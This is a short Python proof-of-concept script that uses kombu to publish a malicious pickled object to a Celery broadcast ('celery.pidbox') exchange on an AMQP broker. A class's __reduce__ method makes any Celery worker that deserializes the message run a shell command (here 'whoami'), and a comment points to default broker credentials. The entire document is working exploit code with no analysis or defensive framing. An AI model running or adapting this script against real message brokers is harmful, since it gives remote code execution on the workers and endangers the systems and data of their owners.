from kombu import Connection, Exchange, Producer
import time

import os
class RCE:
    def __reduce__(self):
        cmd = ('whoami')
        return os.system, (cmd,)

amqp_url = 'amqp://test:test@localhost:5672//' # default AMQP creds: guest:guest

exchange_name = 'celery.pidbox'
exchange = Exchange(exchange_name, type='fanout', durable=False)
data = RCE()

with Connection(amqp_url) as connection:
    producer = Producer(connection)
    producer.publish(
        data,
        exchange=exchange,
        routing_key='',
        declare=[exchange],
        serializer='pickle',
        headers={'clock': 1, 'expires': time.time() + 200}
    )
    print("Message published successfully.")
